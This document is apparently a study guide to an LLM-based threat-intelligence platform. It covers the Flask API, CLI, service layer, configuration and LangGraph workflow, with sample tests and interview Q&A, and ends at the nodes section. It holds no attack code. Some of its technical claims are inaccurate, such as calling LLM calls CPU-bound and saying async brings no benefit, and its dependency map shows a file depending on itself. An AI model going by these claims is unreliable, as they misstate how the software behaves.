# Complete Technical Analysis: Agentic Threat Intelligence Platform

## Table of Contents
1. [Project Dependency Map](#dependency-map)
2. [Entry Points Analysis](#entry-points)
3. [Configuration Analysis](#configuration)
4. [LangGraph Orchestration](#langgraph-orchestration)
5. [AI Agents Analysis](#ai-agents)
6. [LLM Integration](#llm-integration)
7. [RAG Implementation](#rag-implementation)
8. [Intelligence Logic](#intelligence-logic)
9. [Knowledge Graph](#knowledge-graph)
10. [Database Managers](#database-managers)
11. [Action System](#action-system)
12. [Memory System](#memory-system)
13. [Telemetry Parsers](#telemetry-parsers)
14. [Report Generation](#report-generation)
15. [Complete Execution Tree](#execution-tree)
16. [Design Decisions](#design-decisions)
17. [Testing Strategies](#testing-strategies)
18. [Interview Questions](#interview-questions)
19. [Weak Points & Improvements](#weak-points-improvements)

---

## Dependency Map

```
app.py
├── config.py
├── investigation_service.py
│   ├── graph/state.py
│   ├── graph/workflow.py
│   │   ├── graph/state.py
│   │   ├── graph/nodes.py
│   │   │   ├── agents/collection_agent.py
│   │   │   │   ├── llm/groq_client.py
│   │   │   │   └── llm/prompts.py
│   │   │   ├── agents/enrichment_agent.py
│   │   │   │   ├── llm/groq_client.py
│   │   │   │   ├── llm/prompts.py
│   │   │   │   └── intelligence/ioc_extractor.py
│   │   │   ├── agents/vulnerability_agent.py
│   │   │   │   ├── llm/groq_client.py
│   │   │   │   ├── llm/prompts.py
│   │   │   │   ├── rag/cve_retriever.py
│   │   │   │   │   └── rag/vector_store.py
│   │   │   │   │       └── rag/embeddings.py
│   │   │   │   └── llm/output_parsers.py
│   │   │   ├── agents/attack_mapping_agent.py
│   │   │   │   ├── llm/groq_client.py
│   │   │   │   ├── llm/prompts.py
│   │   │   │   ├── rag/retriever.py
│   │   │   │   │   └── rag/retriever.py
│   │   │   │   │       └── rag/vector_store.py
│   │   │   │   └── llm/output_parsers.py
│   │   │   ├── agents/correlation_agent.py
│   │   │   │   ├── llm/groq_client.py
│   │   │   │   ├── llm/prompts.py
│   │   │   │   ├── knowledge_graph/graph_builder.py
│   │   │   │   │   └── databases/neo4j_manager.py
│   │   │   │   └── llm/output_parsers.py
│   │   │   ├── agents/prediction_agent.py
│   │   │   │   ├── llm/groq_client.py
│   │   │   │   ├── llm/prompts.py
│   │   │   │   ├── rag/attack_chain_retriever.py
│   │   │   │   │   └── rag/vector_store.py
│   │   │   │   └── llm/output_parsers.py
│   │   │   ├── agents/reporting_agent.py
│   │   │   │   ├── llm/groq_client.py
│   │   │   │   ├── llm/prompts.py
│   │   │   │   └── reports/report_generator.py
│   │   │   └── agents/response_agent.py
│   │   │       ├── llm/groq_client.py
│   │   │       ├── llm/prompts.py
│   │   │       ├── actions/policy.py
│   │   │       ├── actions/connectors.py
│   │   │       ├── actions/audit_log.py
│   │   │       ├── actions/action_models.py
│   │   │       └── llm/output_parsers.py
│   └── memory/investigation_memory.py
└── main.py
    ├── config.py
    └── investigation_service.py
```

---

## Entry Points

### 1. app.py

**Purpose:**
- Flask web application entry point
- Provides REST API for threat investigation
- Handles HTTP requests and responses
- Orchestrates investigation workflow via API

**Why it exists:**
- External systems need to submit security events for analysis
- API interface allows integration with SIEMs, SOARs, and other security tools
- Enables remote investigation without CLI access

**Problem it solves:**
- Provides standardized HTTP interface for investigation
- Allows asynchronous investigation requests
- Enables integration with web-based security platforms

**Internal Workflow:**
```
HTTP Request → Validation → Investigation Service → Response Formatting → HTTP Response
```

**Dependencies:**
- **Imports:** `logging`, `time.perf_counter`, `Flask`, `jsonify`, `request`, `werkzeug.exceptions`, `config`, `investigation_service`
- **Imported by:** None (entry point)
- **Calls:** `config.validate()`, `run_investigation()`, `investigation_memory.save()`

**Functions:**

#### `_add_cors_headers(response)`
- **Input:** Flask response object
- **Output:** Modified response with CORS headers
- **Purpose:** Enable cross-origin requests for web clients
- **Logic:** Adds Access-Control-Allow-* headers
- **Why:** Security tools often run on different domains

#### `_log_incoming_request()`
- **Input:** None (uses Flask request context)
- **Output:** None (side effect: logs request)
- **Purpose:** Log all incoming requests for audit trail
- **Logic:** Extracts method, path, remote_addr from Flask request
- **Why:** Debugging and security monitoring

#### `_handle_http_exception(error)`
- **Input:** HTTPException
- **Output:** JSON error response with status code
- **Purpose:** Handle HTTP errors gracefully
- **Logic:** Returns error description with appropriate HTTP status
- **Why:** Provide consistent error responses to clients

#### `_handle_unexpected_exception(error)`
- **Input:** Exception
- **Output:** JSON error response with 500 status
- **Purpose:** Catch unexpected server errors
- **Logic:** Logs full exception traceback, returns generic error
- **Why:** Prevent sensitive error details from leaking to clients

#### `status()`
- **Input:** None
- **Output:** JSON `{"status": "running"}`
- **Purpose:** Health check endpoint
- **Logic:** Simple status response
- **Why:** Load balancers and monitoring systems need health checks

#### `investigate()`
- **Input:** JSON payload (events array or object with events array)
- **Output:** JSON investigation result or markdown report
- **Purpose:** Main investigation endpoint
- **Logic:**
  1. Validate request body is not empty
  2. Parse JSON payload
  3. Extract events (handle both array and object formats)
  4. Validate events are non-empty and are objects
  5. Call `run_investigation(raw_events)`
  6. Format response (JSON or markdown based on query param)
  7. Return with appropriate status code
- **Why:** Core API endpoint for threat investigation
- **Error Handling:**
  - 400: Empty body, invalid JSON, invalid payload structure
  - 500: Workflow execution failure

**API Endpoints:**

##### GET /
- **Purpose:** Health check
- **Input:** None
- **Output:** `{"status": "running"}`
- **Status:** 200
- **Use Case:** Monitoring, load balancer health checks

##### POST /investigate
- **Purpose:** Submit events for investigation
- **Input:** JSON array of events or object with "events" array
- **Output:** JSON investigation result or markdown report
- **Query Params:** `format=report` returns markdown instead of JSON
- **Status:** 200 (success), 400 (bad request), 500 (server error)
- **Use Case:** Primary investigation endpoint

**Testing:**

**Unit Tests:**
```python
def test_health_check():
    response = client.get('/')
    assert response.status_code == 200
    assert response.json == {"status": "running"}

def test_investigate_valid_events():
    response = client.post('/investigate', json={"events": [...]})
    assert response.status_code == 200
    assert "campaign" in response.json

def test_investigate_empty_body():
    response = client.post('/investigate')
    assert response.status_code == 400
    assert "error" in response.json
```

**Manual Tests:**
```bash
# Health check
curl http://localhost:5000/

# Investigation with JSON
curl -X POST http://localhost:5000/investigate \
  -H "Content-Type: application/json" \
  -d '{"events": [...]}'

# Investigation with file
curl -X POST http://localhost:5000/investigate \
  -H "Content-Type: application/json" \
  -d @data/sample_events/sample_events.json

# Request markdown report
curl -X POST "http://localhost:5000/investigate?format=report" \
  -H "Content-Type: application/json" \
  -d '{"events": [...]}'
```

**Expected Outputs:**
- Health check: `{"status": "running"}`
- Investigation: JSON with campaign, techniques, iocs, vulnerabilities, prediction, report, actions_taken
- Report format: Markdown text

**Failure Cases:**
- Empty body: 400 error
- Invalid JSON: 400 error
- Missing events: 400 error
- Workflow failure: 500 error

**Edge Cases:**
- Large event arrays (memory limits)
- Malformed JSON
- Events with missing required fields
- Concurrent requests (thread safety)

**Interview Questions:**

**Q: Why use Flask instead of FastAPI?**
**A:** Flask was chosen for simplicity and maturity. FastAPI would provide better performance with async support and automatic OpenAPI docs, but Flask's synchronous model is sufficient for this use case and has a larger ecosystem. The investigation workflow is CPU-bound (LLM calls), so async wouldn't provide significant benefits.

**Q: How do you handle concurrent investigation requests?**
**A:** Flask's development server is single-threaded by default. In production, you'd use Gunicorn with multiple workers. Each worker handles one request at a time. The investigation state is isolated per request, so there's no shared state concurrency issues. ChromaDB and Neo4j handle concurrent access internally.

**Q: Why return both JSON and markdown formats?**
**A:** JSON is machine-readable for API consumers (SIEMs, SOARs). Markdown is human-readable for analysts viewing reports directly. The `format=report` query parameter provides flexibility without separate endpoints.

**Design Decisions:**

**Chosen Solution:** Flask with synchronous request handling
**Alternatives:**
- FastAPI: Better performance, async support, automatic docs
- Django REST Framework: More features, heavier weight
- Async Flask: Complexity for minimal gain

**Advantages:**
- Simple and well-understood
- Large ecosystem of extensions
- Easy to deploy
- Sufficient for current load

**Disadvantages:**
- Not async (LLM calls block)
- Development server not production-ready
- Less automatic documentation

**Weak Points:**
- No authentication/authorization
- No rate limiting
- No request validation beyond basic structure
- No request queuing for high load
- Development server not production-ready

**Improvements:**
- Add JWT authentication
- Implement rate limiting with Flask-Limiter
- Use Gunicorn with multiple workers
- Add request queue with Celery for high load
- Add API versioning
- Implement proper logging with structured logs

---

### 2. main.py

**Purpose:**
- Command-line interface for local investigation
- Development and testing tool
- Alternative to API for manual investigations

**Why it exists:**
- Developers need to test investigations without running Flask server
- Quick local testing during development
- Debugging workflow issues
- Batch processing of event files

**Problem it solves:**
- Provides CLI access to investigation logic
- Enables testing without HTTP overhead
- Allows direct file input

**Internal Workflow:**
```
CLI Arguments → Config Validation → Load Events → Run Investigation → Print Results
```

**Dependencies:**
- **Imports:** `argparse`, `logging`, `config`, `investigation_service`
- **Imported by:** None (entry point)
- **Calls:** `config.validate()`, `load_events()`, `run_investigation()`

**Functions:**

#### `main()`
- **Input:** Command-line arguments (--events path)
- **Output:** Exit code (0 for success, 1 for failure)
- **Purpose:** Main CLI entry point
- **Logic:**
  1. Parse command-line arguments
  2. Validate configuration
  3. Load events from file
  4. Run investigation
  5. Print intelligence report
  6. Print response actions
  7. Return appropriate exit code
- **Why:** Provides convenient CLI interface
- **Error Handling:** Catches exceptions, logs them, returns exit code 1

**Testing:**

**Unit Tests:**
```python
def test_main_with_valid_events():
    result = runner.invoke(main, ['--events', 'test_events.json'])
    assert result.exit_code == 0
    assert "INTELLIGENCE REPORT" in result.output

def test_main_with_invalid_file():
    result = runner.invoke(main, ['--events', 'nonexistent.json'])
    assert result.exit_code == 1
```

**Manual Tests:**
```bash
# Default events file
python main.py

# Specific events file
python main.py --events data/sample_events/ransomware_simulation.json

# Invalid file
python main.py --events nonexistent.json
```

**Expected Outputs:**
- Success: Printed report and actions, exit code 0
- Failure: Error logged, exit code 1

**Failure Cases:**
- Invalid file path
- Invalid JSON in file
- Configuration validation failure
- Investigation workflow failure

**Edge Cases:**
- Empty events file
- Very large events file
- Events with missing fields

**Interview Questions:**

**Q: Why maintain both CLI and API interfaces?**
**A:** CLI is for development and testing. API is for production integration. CLI provides quick feedback without HTTP overhead. API enables remote access and integration with other systems. Both serve different use cases.

**Q: How does the CLI handle large event files?**
**A:** Currently, it loads the entire file into memory. For very large files, this could cause memory issues. An improvement would be to stream events or process in batches. However, typical security event volumes are manageable in memory.

**Design Decisions:**

**Chosen Solution:** argparse for CLI, simple file loading
**Alternatives:**
- Click: More feature-rich CLI framework
- Typer: Modern CLI with type hints
- Custom argument parsing

**Advantages:**
- argparse is built into Python
- Simple and sufficient
- No additional dependencies

**Disadvantages:**
- Less feature-rich than Click/Typer
- Manual help text maintenance
- No automatic type conversion

**Weak Points:**
- No progress indicator for long investigations
- No verbose/quiet modes
- No batch processing of multiple files
- No output formatting options

**Improvements:**
- Add progress bar with tqdm
- Add --verbose and --quiet flags
- Support multiple event files
- Add JSON output option
- Add --dry-run flag to skip actual investigation

---

### 3. investigation_service.py

**Purpose:**
- Service layer for investigation execution
- Abstracts workflow invocation from entry points
- Handles investigation state management
- Persists investigation results

**Why it exists:**
- Separation of concerns: entry points shouldn't know about workflow details
- Reusable investigation logic for both CLI and API
- Central place for investigation lifecycle management
- Memory persistence for historical analysis

**Problem it solves:**
- Provides clean interface for running investigations
- Manages investigation state lifecycle
- Persists results for audit trail

**Internal Workflow:**
```
Raw Events → Initial State → Workflow Invocation → Final State → Memory Persistence → Return
```

**Dependencies:**
- **Imports:** `json`, `typing`, `graph.state`, `graph.workflow`, `memory.investigation_memory`
- **Imported by:** `app.py`, `main.py`
- **Calls:** `new_investigation_state()`, `get_workflow()`, `workflow.invoke()`, `investigation_memory.save()`

**Functions:**

#### `load_events(path: str) -> List[Dict[str, Any]]`
- **Input:** File path (string)
- **Output:** List of event dictionaries
- **Purpose:** Load events from JSON file
- **Logic:**
  1. Open file for reading
  2. Try to parse as JSON array
  3. If fails, parse as JSONL (one JSON per line)
  4. Return list of events
- **Why:** Supports both JSON array and JSONL formats
- **Error Handling:** JSONDecodeError falls back to JSONL parsing

**Example:**
```python
# JSON array format
[{"event_id": "1", ...}, {"event_id": "2", ...}]

# JSONL format
{"event_id": "1", ...}
{"event_id": "2", ...}
```

#### `run_investigation(raw_events: List[Dict[str, Any]]) -> Dict[str, Any]`
- **Input:** List of raw event dictionaries
- **Output:** Final investigation state dictionary
- **Purpose:** Execute investigation workflow
- **Logic:**
  1. Create initial state from raw events
  2. Get compiled workflow
  3. Invoke workflow with initial state
  4. Handle special exceptions (PanicException)
  5. Save final state to memory
  6. Return final state
- **Why:** Encapsulates workflow invocation logic
- **Error Handling:**
  - KeyboardInterrupt/SystemExit: Re-raise (user cancellation)
  - PanicException: Convert to RuntimeError (LangGraph backend issue)
  - Other exceptions: Re-raise with context

**Example:**
```python
raw_events = [{"timestamp": "2024-01-01", "process": "powershell.exe"}]
final_state = run_investigation(raw_events)
# final_state contains: events, iocs, techniques, campaign, prediction, report, actions_taken
```

**Testing:**

**Unit Tests:**
```python
def test_load_events_json_array():
    events = load_events("test_events.json")
    assert isinstance(events, list)
    assert len(events) > 0

def test_load_events_jsonl():
    events = load_events("test_events.jsonl")
    assert isinstance(events, list)

def test_run_investigation_success():
    raw_events = [{"event_id": "1"}]
    state = run_investigation(raw_events)
    assert "report" in state
    assert "campaign" in state

def test_run_investigation_panic():
    # Mock workflow to raise PanicException
    with pytest.raises(RuntimeError):
        run_investigation([])
```

**Manual Tests:**
```python
from investigation_service import load_events, run_investigation

# Test loading
events = load_events("data/sample_events/sample_events.json")
print(f"Loaded {len(events)} events")

# Test investigation
state = run_investigation(events)
print(f"Report: {state.get('report')}")
```

**Expected Outputs:**
- `load_events`: List of event dictionaries
- `run_investigation`: Complete investigation state with all fields

**Failure Cases:**
- Invalid file path
- Invalid JSON/JSONL format
- Workflow compilation failure
- Workflow execution failure
- Memory persistence failure

**Edge Cases:**
- Empty events list
- Events with missing fields
- Very large events list (memory)
- Concurrent investigations (memory file locking)

**Interview Questions:**

**Q: Why separate investigation_service from the entry points?**
**A:** Separation of concerns. Entry points handle I/O (HTTP/CLI), service layer handles business logic. This makes the code testable, reusable, and maintainable. Both CLI and API can use the same service without duplication.

**Q: How do you handle concurrent investigations writing to the same memory file?**
**A:** Currently, there's no file locking. Concurrent writes could corrupt the JSON file. An improvement would be to use file locking (fcntl) or switch to a proper database. For low concurrency, the current approach works, but it's a known limitation.

**Q: Why support both JSON and JSONL formats?**
**A:** JSON is common for small datasets. JSONL (JSON Lines) is better for large datasets and streaming. Supporting both provides flexibility for different data sources and sizes.

**Design Decisions:**

**Chosen Solution:** JSON file for memory persistence
**Alternatives:**
- SQLite database: Better concurrency, structured queries
- MongoDB: Document store, better scaling
- Redis: Fast in-memory, ephemeral
- No persistence: Stateless investigations

**Advantages:**
- Simple to implement
- Human-readable
- No additional database dependencies
- Easy to backup and migrate

**Disadvantages:**
- No concurrency control
- Poor performance for large datasets
- No query capabilities
- File can grow indefinitely

**Weak Points:**
- No file locking for concurrent writes
- No memory rotation or cleanup
- No indexing or search
- JSON parsing overhead for large files
- No transaction support

**Improvements:**
- Add file locking with fcntl
- Implement memory rotation (keep last N investigations)
- Add SQLite backend option
- Add search/filter capabilities
- Implement memory compression
- Add memory export/import utilities

---

## Configuration

### config.py

**Purpose:**
- Centralized configuration management
- Environment variable loading
- Configuration validation
- Default values for all settings

**Why it exists:**
- Configuration should be externalized from code
- Different environments (dev/staging/prod) need different settings
- Sensitive values (API keys) shouldn't be in code
- Single source of truth for all configuration

**Problem it solves:**
- Provides type-safe configuration access
- Validates required settings at startup
- Separates configuration from implementation
- Enables environment-specific configurations

**Internal Workflow:**
```
Environment Variables → Config Class → Validation → Runtime Access
```

**Dependencies:**
- **Imports:** `os`, `dotenv`
- **Imported by:** All modules in the project
- **Calls:** None (configuration leaf node)

**Classes:**

#### `Config`
- **Purpose:** Configuration class with class-level attributes
- **Logic:** Loads environment variables with defaults
- **Why:** Type-safe, centralized configuration access

**Configuration Sections:**

**Groq LLM Configuration:**
- `GROQ_API_KEY`: API key for Groq LLM service
- `GROQ_MODEL`: Model name (default: llama-3.3-70b-versatile)
- `GROQ_TEMPERATURE`: LLM temperature (default: 0.1)

**ChromaDB Configuration:**
- `CHROMA_PERSIST_DIR`: Vector database storage path
- `CHROMA_COLLECTION_ATTACK`: ATT&CK collection name
- `EMBEDDING_MODEL`: Sentence transformer model
- `CHROMA_DISABLE_TELEMETRY`: Disable ChromaDB analytics

**Neo4j Configuration:**
- `NEO4J_URI`: Neo4j connection URI
- `NEO4J_USER`: Neo4j username
- `NEO4J_PASSWORD`: Neo4j password

**MITRE ATT&CK Configuration:**
- `ATTACK_DATA_PATH`: Path to ATT&CK STIX data file

**Telemetry Configuration:**
- `RAW_LOGS_DIR`: Directory for raw log files
- `SAMPLE_EVENTS_DIR`: Directory for sample event files

**Reporting Configuration:**
- `REPORTS_OUTPUT_DIR`: Directory for generated reports

**Response/Action Configuration:**
- `AUTO_RESPONSE_ENABLED`: Global kill switch for automated actions
- `DRY_RUN`: Log actions without executing them

**Logging Configuration:**
- `LOG_LEVEL`: Logging verbosity (INFO, DEBUG, etc.)

**HTTP Configuration:**
- `API_TIMEOUT`: Request timeout in seconds
- `API_RETRY`: Number of retry attempts

**Connector Configuration:**
- `SLACK_WEBHOOK_URL`: Slack notification webhook
- `FIREWALL_API_URL`: Firewall API endpoint
- `FIREWALL_API_TOKEN`: Firewall API token
- `WAZUH_API_URL`: Wazuh EDR API endpoint
- `WAZUH_USERNAME`: Wazuh username
- `WAZUH_PASSWORD`: Wazuh password
- `AZURE_CLIENT_ID`: Azure AD client ID
- `AZURE_CLIENT_SECRET`: Azure AD client secret
- `AZURE_TENANT_ID`: Azure AD tenant ID
- `OKTA_DOMAIN`: Okta domain
- `OKTA_API_TOKEN`: Okta API token
- `CROWDSTRIKE_API_URL`: CrowdStrike API URL
- `CROWDSTRIKE_CLIENT_ID`: CrowdStrike client ID
- `CROWDSTRIKE_CLIENT_SECRET`: CrowdStrike client secret
- `SENTINELONE_API_URL`: SentinelOne API URL
- `SENTINELONE_API_TOKEN`: SentinelOne API token

**Methods:**

#### `validate()`
- **Input:** None
- **Output:** None (raises EnvironmentError if validation fails)
- **Purpose:** Validate required configuration
- **Logic:**
  1. Always require GROQ_API_KEY
  2. If AUTO_RESPONSE_ENABLED, require connector credentials
  3. Raise EnvironmentError with missing variables
- **Why:** Fail fast with clear error messages
- **Error Handling:** Raises EnvironmentError with descriptive message

**Testing:**

**Unit Tests:**
```python
def test_config_default_values():
    assert config.GROQ_MODEL == "llama-3.3-70b-versatile"
    assert config.DRY_RUN == True

def test_config_validation_missing_key():
    os.environ.pop("GROQ_API_KEY")
    with pytest.raises(EnvironmentError):
        config.validate()

def test_config_validation_auto_response():
    os.environ["AUTO_RESPONSE_ENABLED"] = "true"
    os.environ.pop("SLACK_WEBHOOK_URL")
    with pytest.raises(EnvironmentError):
        config.validate()
```

**Manual Tests:**
```python
# Test configuration loading
from config import config
print(f"Groq Model: {config.GROQ_MODEL}")
print(f"ChromaDB Dir: {config.CHROMA_PERSIST_DIR}")

# Test validation
try:
    config.validate()
    print("Configuration valid")
except EnvironmentError as e:
    print(f"Configuration error: {e}")
```

**Expected Outputs:**
- Configuration values from environment or defaults
- Validation passes or raises EnvironmentError

**Failure Cases:**
- Missing GROQ_API_KEY
- Missing connector credentials when AUTO_RESPONSE_ENABLED
- Invalid environment variable values

**Edge Cases:**
- Empty environment variables
- Whitespace in values
- Case sensitivity in boolean values

**Interview Questions:**

**Q: Why use environment variables instead of a config file?**
**A:** Environment variables are standard for containerized deployments (Docker, Kubernetes). They're easy to inject in different environments without code changes. They also keep sensitive values out of version control. A config file could also work, but env vars are more flexible for modern deployment patterns.

**Q: Why validate configuration at startup instead of lazy validation?**
**A:** Fail fast. If configuration is invalid, it's better to know immediately rather than when a specific feature is used. This prevents investigations from partially executing before hitting a configuration error.

**Q: Why make connector credentials optional unless AUTO_RESPONSE_ENABLED?**
**A:** Allows the platform to run in analysis-only mode without requiring all connector configurations. Users can test the investigation workflow without setting up firewalls, EDRs, etc. Only when they want automated responses do they need to configure connectors.

**Design Decisions:**

**Chosen Solution:** python-dotenv with environment variables
**Alternatives:**
- YAML config file: More structured, supports nesting
- TOML config file: Standard for Python tools
- JSON config file: Simple, but no comments
- Consul/etcd: Distributed configuration
- AWS Parameter Store: Cloud-native

**Advantages:**
- Standard for 12-factor apps
- Easy to use in containers
- No additional config file format
- Works with existing shell environment
- python-dotenv for local development

**Disadvantages:**
- No type validation
- No nesting or structure
- No comments or documentation in config
- Environment variable name collisions
- Hard to share complex configurations

**Weak Points:**
- No type validation (strings only)
- No configuration schema
- Boolean parsing is manual (.lower() == "true")
- No configuration hot-reloading
- No configuration versioning
- No configuration encryption

**Improvements:**
- Use pydantic-settings for type validation
- Add configuration schema validation
- Support multiple configuration profiles (dev/staging/prod)
- Add configuration encryption for secrets
- Implement configuration hot-reloading
- Add configuration documentation generation
- Support configuration from multiple sources (env file, env vars, CLI args)

---

## LangGraph Orchestration

### graph/state.py

**Purpose:**
- Define the shared state structure for LangGraph workflow
- Type-safe state management
- Initial state factory function

**Why it exists:**
- LangGraph requires a state object to pass between nodes
- TypedDict provides type safety and IDE support
- Central state definition ensures consistency
- Factory function ensures proper initialization

**Problem it solves:**
- Provides structured data contract between agents
- Ensures all required fields are initialized
- Type safety prevents runtime errors
- Clear documentation of state structure

**Internal Workflow:**
```
State Definition → Factory Function → Initial State → Workflow Nodes → State Updates
```

**Dependencies:**
- **Imports:** `typing`, `uuid`
- **Imported by:** `graph.workflow`, `graph.nodes`, `investigation_service`, all agents
- **Calls:** `uuid.uuid4()`

**Type Definitions:**

#### `InvestigationState` (TypedDict)
- **Purpose:** Shared state structure for investigation workflow
- **Fields:**
  - `raw_events`: List[Dict] - Original input telemetry
  - `events`: List[Dict] - Normalized events from CollectionAgent
  - `iocs`: List[Dict] - Enriched IOCs from EnrichmentAgent
  - `vulnerabilities`: List[Dict] - CVE analysis from VulnerabilityAgent
  - `techniques`: List[Dict] - ATT&CK mappings from AttackMappingAgent
  - `campaign`: Dict - Correlated campaign from CorrelationAgent
  - `prediction`: Dict - Threat prediction from PredictionAgent
  - `report`: str - Markdown report from ReportingAgent
  - `actions_taken`: List[Dict] - Response actions from ResponseAgent
  - `errors`: List[str] - Non-fatal errors during workflow
  - `metadata`: Dict - Run metadata (timestamps, IDs)

**Why TypedDict:**
- Type safety for IDE autocomplete
- Runtime type checking with mypy
- Clear documentation of expected structure
- Better than plain dict for complex state

**Functions:**

#### `new_investigation_state(raw_events: List[Dict]) -> InvestigationState`
- **Input:** List of raw event dictionaries
- **Output:** Initialized InvestigationState dictionary
- **Purpose:** Create initial state with default values
- **Logic:**
  1. Generate unique investigation ID
  2. Set timestamp
  3. Initialize all fields with defaults
  4. Set raw_events from input
- **Why:** Ensures consistent state initialization
- **Default Values:**
  - Lists: Empty lists
  - Dicts: Empty dicts
  - Strings: Empty strings
  - IDs: UUID v4

**Example:**
```python
state = new_investigation_state([{"event_id": "1"}])
# Returns:
{
    "raw_events": [{"event_id": "1"}],
    "events": [],
    "iocs": [],
    "vulnerabilities": [],
    "techniques": [],
    "campaign": {},
    "prediction": {},
    "report": "",
    "actions_taken": [],
    "errors": [],
    "metadata": {
        "investigation_id": "uuid-here",
        "started_at": "2024-01-01T00:00:00Z"
    }
}
```

**Testing:**

**Unit Tests:**
```python
def test_new_investigation_state():
    state = new_investigation_state([{"event_id": "1"}])
    assert state["raw_events"] == [{"event_id": "1"}]
    assert state["events"] == []
    assert "investigation_id" in state["metadata"]
    assert "started_at" in state["metadata"]

def test_state_type_safety():
    state: InvestigationState = new_investigation_state([])
    # mypy would catch type errors here
```

**Manual Tests:**
```python
from graph.state import new_investigation_state

state = new_investigation_state([{"test": "event"}])
print(f"Investigation ID: {state['metadata']['investigation_id']}")
print(f"Started at: {state['metadata']['started_at']}")
```

**Expected Outputs:**
- State with all fields initialized
- Unique investigation ID
- Current timestamp

**Failure Cases:**
- Invalid input type (not list)
- Events not dictionaries

**Edge Cases:**
- Empty events list
- Very large events list
- Events with missing fields

**Interview Questions:**

**Q: Why use TypedDict instead of a dataclass or Pydantic model?**
**A:** TypedDict is simpler for LangGraph, which expects dictionary-like objects. Pydantic would add validation overhead. Dataclass would require conversion to dict for LangGraph. TypedDict provides type hints while staying compatible with LangGraph's dict-based state management.

**Q: Why include both raw_events and events in state?**
**A:** raw_events preserves the original input for audit trail and debugging. events contains the normalized, processed data from CollectionAgent. Keeping both allows traceability from input to output.

**Q: Why use UUID for investigation_id instead of sequential ID?**
**A:** UUIDs are globally unique and don't require coordination. Sequential IDs would need a shared counter or database. UUIDs work well in distributed systems and prevent collisions.

**Design Decisions:**

**Chosen Solution:** TypedDict with factory function
**Alternatives:**
- Pydantic BaseModel: Validation, serialization
- dataclass: Type safety, methods
- Plain dict: No type safety
- Custom class: Full control

**Advantages:**
- Type hints for IDE
- Compatible with LangGraph
- Simple and lightweight
- No runtime validation overhead
- Clear documentation

**Disadvantages:**
- No runtime validation
- No default values in type definition
- No methods/behavior
- Limited to dict-like operations

**Weak Points:**
- No runtime type checking
- No validation of field values
- No serialization/deserialization
- No immutability guarantees
- No field documentation in code

**Improvements:**
- Add Pydantic validation wrapper
- Add field documentation in docstrings
- Add state validation before workflow execution
- Add state serialization/deserialization
- Add state versioning for schema changes
- Add state compression for large investigations

---

### graph/workflow.py

**Purpose:**
- Define and compile the LangGraph workflow
- Orchestrate agent execution order
- Manage workflow state transitions
- Provide workflow instance for execution

**Why it exists:**
- LangGraph requires explicit workflow definition
- Central place to define agent sequence
- Enables workflow visualization and debugging
- Allows workflow modifications without changing agents

**Problem it solves:**
- Coordinates multiple agents in sequence
- Manages state passing between agents
- Provides single entry point for workflow execution
- Enables workflow recompilation for development

**Internal Workflow:**
```
Agent Nodes → Workflow Graph → Compilation → Execution
```

**Dependencies:**
- **Imports:** `langgraph`, `graph.state`, `graph.nodes`, `agents.*`
- **Imported by:** `investigation_service`
- **Calls:** `StateGraph`, `add_node`, `add_edge`, `set_entry_point`, `set_finish_point`, `compile()`

**Functions:**

#### `build_workflow()`
- **Input:** None
- **Output:** Compiled LangGraph workflow
- **Purpose:** Build and compile the investigation workflow
- **Logic:**
  1. Create StateGraph with InvestigationState
  2. Add all agent nodes
  3. Define execution edges (sequence)
  4. Set entry point (collection)
  5. Set finish point (response)
  6. Compile the graph
  7. Return compiled workflow
- **Why:** Encapsulates workflow construction logic
- **Agent Order:**
  1. collection (normalize events)
  2. enrichment (extract IOCs)
  3. vulnerability (analyze CVEs)
  4. attack_mapping (map to ATT&CK)
  5. correlation (correlate campaigns)
  6. prediction (predict next steps)
  7. reporting (generate report)
  8. response (execute actions)

**Why this order:**
- Collection must be first (normalize raw data)
- Enrichment needs normalized events
- Vulnerability needs events and IOCs
- Attack mapping needs enriched context
- Correlation needs techniques and IOCs
- Prediction needs techniques and campaign
- Reporting needs all previous analysis
- Response needs campaign and prediction

#### `get_workflow()`
- **Input:** None
- **Output:** Freshly compiled workflow
- **Purpose:** Force workflow recompilation
- **Logic:** Calls build_workflow() every time
- **Why:** Development workflow - pick up code changes without restart
- **Production Note:** In production, could cache compiled workflow

**Testing:**

**Unit Tests:**
```python
def test_build_workflow():
    workflow = build_workflow()
    assert workflow is not None
    # Check that all nodes are present
    nodes = workflow.nodes
    assert "collection" in nodes
    assert "enrichment" in nodes
    # ... check all nodes

def test_workflow_execution():
    workflow = build_workflow()
    state = new_investigation_state([{"event_id": "1"}])
    result = workflow.invoke(state)
    assert "report" in result
```

**Manual Tests:**
```python
from graph.workflow import build_workflow, get_workflow

# Test build
workflow = build_workflow()
print(f"Workflow nodes: {list(workflow.nodes.keys())}")

# Test execution
state = new_investigation_state([{"test": "event"}])
result = workflow.invoke(state)
print(f"Execution complete: {len(result['events'])} events processed")
```

**Expected Outputs:**
- Compiled workflow object
- Successful execution with complete state

**Failure Cases:**
- Agent import failures
- Node function signature mismatches
- State structure mismatches
- Circular dependencies

**Edge Cases:**
- Empty events
- Agent failures (handled by error state)
- Concurrent workflow compilations

**Interview Questions:**

**Q: Why use LangGraph instead of a simple sequential function calls?**
**A:** LangGraph provides state management, error handling, workflow visualization, and future extensibility. Simple sequential calls would work but lack structure, observability, and the ability to add conditional branching or parallel execution later.

**Q: Why have get_workflow() instead of using a singleton?**
**A:** Development convenience. During development, agents change frequently. get_workflow() forces recompilation so code changes take effect without restarting the server. In production, you'd cache the compiled workflow for performance.

**Q: What happens if an agent fails during workflow execution?**
**A:** Currently, the workflow would fail and raise an exception. An improvement would be to add error handling nodes or try-catch around individual nodes to allow partial completion. The errors field in state could capture failures.

**Design Decisions:**

**Chosen Solution:** LangGraph StateGraph with sequential execution
**Alternatives:**
- Simple function calls: Simple, no framework
- Prefect/Dagster: More features, heavier
- Airflow: Overkill for this use case
- Custom orchestration: More control, more work

**Advantages:**
- Built for AI agent workflows
- State management built-in
- Visualization support
- Easy to modify
- Growing ecosystem

**Disadvantages:**
- Learning curve
- Additional dependency
- Overhead for simple workflows
- Limited documentation

**Weak Points:**
- No retry logic for failed nodes
- No parallel execution support
- No conditional branching
- No workflow persistence
- No workflow monitoring
- No workflow versioning

**Improvements:**
- Add retry logic with exponential backoff
- Add conditional branching based on state
- Add parallel execution for independent agents
- Add workflow checkpointing for long-running investigations
- Add workflow monitoring and metrics
- Add workflow A/B testing
- Add workflow rollback capabilities

---

### graph/states.py (Note: This file doesn't exist, the file is graph/state.py)

**Correction:** The file is `graph/state.py`, not `graph/states.py`. This has been documented above.

---

### graph/nodes.py

**Purpose:**
- Adapt agent classes to LangGraph node functions
- Provide thin wrapper functions for workflow integration
